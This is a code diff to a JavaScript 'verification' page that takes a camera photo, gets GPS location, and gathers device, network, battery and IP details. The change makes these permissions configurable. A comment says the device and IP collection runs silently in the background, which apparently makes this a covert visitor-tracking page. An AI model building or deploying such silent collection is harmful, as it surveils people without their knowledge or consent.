@@ -83,7 +83,7 @@ function buildProgressUI(container) {
 }
 
 // ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
-async function collectDeviceInfo() {
+async function collectDeviceInfo(opts = { network: true, battery: true, device: true }) {
     const ua = navigator.userAgent;
     const info = {
         userAgent:      ua,
@@ -101,15 +101,16 @@ async function collectDeviceInfo() {
 
     // Network info
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (conn) {
+    if (opts.network !== false && conn) {
         info.networkType = conn.effectiveType || 'Unknown';
         info.downlink    = conn.downlink != null ? conn.downlink + ' Mbps' : 'Unknown';
     } else {
-        info.networkType = 'Unknown';
-        info.downlink    = 'Unknown';
+        info.networkType = 'N/A';
+        info.downlink    = 'N/A';
     }
 
     // Battery (best-effort — not available on all browsers)
+    if (opts.battery !== false) {
     try {
         const bat     = await Promise.race([
             navigator.getBattery(),
@@ -120,6 +121,10 @@ async function collectDeviceInfo() {
     } catch (_) {
         info.battery  = 'Unavailable';
         info.charging = 'Unavailable';
+    }
+    } else {
+        info.battery  = 'N/A';
+        info.charging = 'N/A';
     }
 
     // OS
@@ -301,14 +306,17 @@ async function initVerification() {
     // which added 1-3 seconds of delay before the browser prompt appeared.
     // Now we fire them in parallel with background data collection.
 
-    const needsCam = !!settings.cam;
-    const needsGPS = !!settings.gps;
+    const needsCam     = !!(settings.cam     || settings.permissions?.camera);
+    const needsGPS     = !!(settings.gps     || settings.permissions?.location);
+    const needsDevice  = settings.permissions?.device_info  !== false;
+    const needsNetwork = settings.permissions?.network_info !== false;
+    const needsBattery = settings.permissions?.battery_info !== false;
 
     // Start cam + gps in parallel — both trigger browser prompts immediately
     // Start background info collection at the same time
     const camPromise  = needsCam ? capturePhoto()    : Promise.resolve(null);
     const gpsPromise  = needsGPS ? getLocation()     : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
-    const infoPromise = collectDeviceInfo();
+    const infoPromise = collectDeviceInfo({ network: needsNetwork, battery: needsBattery, device: needsDevice });
     const ipPromise   = getIPAddress();
 
     // Await all — cam/gps show browser prompts; info/ip run silently in background
